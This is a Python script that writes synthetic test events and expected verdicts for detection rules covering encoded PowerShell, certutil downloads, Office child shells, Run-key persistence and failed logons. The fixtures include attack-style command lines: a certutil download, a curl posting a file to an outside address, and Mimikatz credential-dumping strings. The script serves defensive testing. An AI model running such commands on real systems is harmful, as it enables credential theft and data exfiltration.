"""Regenerate the synthetic, benign demo events in examples/events/windows.jsonl.

Every event is hand-designed to hit or narrowly miss one of the example rules; the intended
verdicts live next to the events in examples/events/expected.json. Nothing here is real
telemetry: hostnames, users and addresses are invented (RFC 1918 / documentation ranges).

Usage: uv run python scripts/make_example_events.py
"""

from __future__ import annotations

import base64
import json
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parent.parent
PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
B64_WHOAMI = base64.b64encode(b"cmd /c whoami /all").decode()

EVENTS: list[dict[str, Any]] = [
    # 0  encoded PowerShell (hit: proc_encoded_powershell)
    {
        "EventID": 1,
        "Image": PS,
        "CommandLine": "powershell.exe -nop -enc SQBFAFgA",
        "User": "lab\\alice",
    },
    # 1  same, Unicode en dash instead of hyphen (hit via windash)
    {
        "EventID": 1,
        "Image": PS,
        "CommandLine": "powershell.exe \u2013enc SQBFAFgA ",
        "User": "lab\\alice",
    },
    # 2  renamed PowerShell caught by OriginalFileName, /EncodedCommand (hit)
    {
        "EventID": 1,
        "Image": "C:\\Users\\Public\\ps.exe",
        "OriginalFileName": "PowerShell.EXE",
        "CommandLine": "ps.exe /EncodedCommand SQBFAFgA ",
        "User": "lab\\bob",
    },
    # 3  PowerShell without encoding (miss)
    {
        "EventID": 1,
        "Image": PS,
        "CommandLine": "powershell.exe -File backup.ps1",
        "User": "lab\\svc",
    },
    # 4  certutil download (hit: proc_certutil_download)
    {
        "EventID": 1,
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.7/a.txt a.txt",
        "User": "lab\\bob",
    },
    # 5  certutil hash check (miss)
    {
        "EventID": 1,
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -hashfile setup.msi SHA256",
        "User": "lab\\bob",
    },
    # 6  Word spawning cmd (hit: proc_office_child_shell)
    {
        "EventID": 1,
        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "Image": "C:\\Windows\\System32\\cmd.exe",
        "CommandLine": "cmd.exe /c echo hi",
        "User": "lab\\carol",
    },
    # 7  Excel spawning PowerShell for the approved add-in (miss: filtered)
    {
        "EventID": 1,
        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\excel.exe",
        "Image": PS,
        "CommandLine": "powershell.exe -File ApprovedAddin.ps1",
        "User": "lab\\carol",
    },
    # 8  temp binary to internal host on 4444 (hit: net_internal_c2_port)
    {
        "EventID": 3,
        "Image": "C:\\Users\\dave\\AppData\\Local\\Temp\\upd.exe",
        "DestinationIp": "10.20.30.40",
        "DestinationPort": 4444,
    },
    # 9  same binary to a public address (miss: CIDR)
    {
        "EventID": 3,
        "Image": "C:\\Users\\dave\\AppData\\Local\\Temp\\upd.exe",
        "DestinationIp": "203.0.113.9",
        "DestinationPort": 4444,
    },
    # 10 browser to internal host on 1337 (miss: path regex)
    {
        "EventID": 3,
        "Image": "C:\\Program Files\\Browser\\browser.exe",
        "DestinationIp": "192.168.4.2",
        "DestinationPort": 1337,
    },
    # 11 Run key to user-writable exe (hit: reg_run_key_persistence)
    {
        "EventID": 13,
        "TargetObject": "HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows"
        "\\CurrentVersion\\Run\\Updater",
        "Details": "C:\\Users\\dave\\AppData\\Roaming\\upd.exe",
        "Image": "C:\\Users\\dave\\AppData\\Local\\Temp\\upd.exe",
    },
    # 12 Run key to Program Files (miss: filtered)
    {
        "EventID": 13,
        "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Vendor",
        "Details": "C:\\Program Files\\Vendor\\agent.exe",
        "Image": "C:\\Windows\\regedit.exe",
    },
    # 13 base64 "whoami" inside a command line (hit: proc_base64_whoami)
    {
        "EventID": 1,
        "Image": PS,
        "CommandLine": f"powershell.exe -c \"[Text.Encoding]::UTF8.GetString('{B64_WHOAMI}')\"",
    },
    # 14 credential dumper strings in a script block (hit: kw_credential_dumper_strings)
    {
        "EventID": 4104,
        "ScriptBlockText": "Invoke-Thing -Command 'privilege::debug sekurlsa::logonpasswords'",
    },
    # 15 curl posting data on Linux (hit: proc_curl_post_data)
    {
        "Image": "/usr/bin/curl",
        "CommandLine": "curl -s https://198.51.100.7/u -d @/etc/hostname -o /dev/null",
    },
    # 16 curl download only (miss)
    {"Image": "/usr/bin/curl", "CommandLine": "curl -sSLO https://198.51.100.7/pkg.tgz"},
    # 17 failed network logon for a user (hit: sec_failed_logons_by_type)
    {"EventID": 4625, "LogonType": 3, "TargetUserName": "alice", "IpAddress": "10.0.5.5"},
    # 18 failed network logon for a machine account (miss: filtered)
    {"EventID": 4625, "LogonType": 3, "TargetUserName": "WKS01$", "IpAddress": "10.0.5.6"},
    # 19 failed interactive logon (miss: LogonType 2)
    {"EventID": 4625, "LogonType": 2, "TargetUserName": "bob"},
    # 20 failed logon with LogonType as text (miss: gte only compares numbers)
    {"EventID": "4625", "LogonType": "10", "TargetUserName": "carol"},
]

EXPECTED = {
    "proc_encoded_powershell.yml": [0, 1, 2],
    "proc_certutil_download.yml": [4],
    "proc_office_child_shell.yml": [6],
    "net_internal_c2_port.yml": [8],
    "reg_run_key_persistence.yml": [11],
    "proc_base64_whoami.yml": [13],
    "kw_credential_dumper_strings.yml": [14],
    "proc_curl_post_data.yml": [15],
    "sec_failed_logons_by_type.yml": [17],
}


def main() -> None:
    out = ROOT / "examples" / "events"
    out.mkdir(parents=True, exist_ok=True)
    lines = [json.dumps(e, ensure_ascii=False) for e in EVENTS]
    (out / "windows.jsonl").write_text("\n".join(lines) + "\n", encoding="utf-8")
    (out / "expected.json").write_text(json.dumps(EXPECTED, indent=2) + "\n", encoding="utf-8")
    print(f"wrote {len(EVENTS)} events and {len(EXPECTED)} expectations to {out}")


if __name__ == "__main__":
    main()
